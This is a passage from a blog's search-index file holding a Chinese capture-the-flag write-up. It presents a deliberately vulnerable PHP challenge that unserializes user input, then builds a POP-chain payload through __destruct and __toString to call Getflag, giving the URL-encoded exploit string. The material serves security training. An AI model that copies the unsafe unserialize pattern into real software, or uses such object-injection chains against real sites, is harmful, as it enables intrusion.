+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过：</strong></p>
+<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
+      <tags>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+</search>
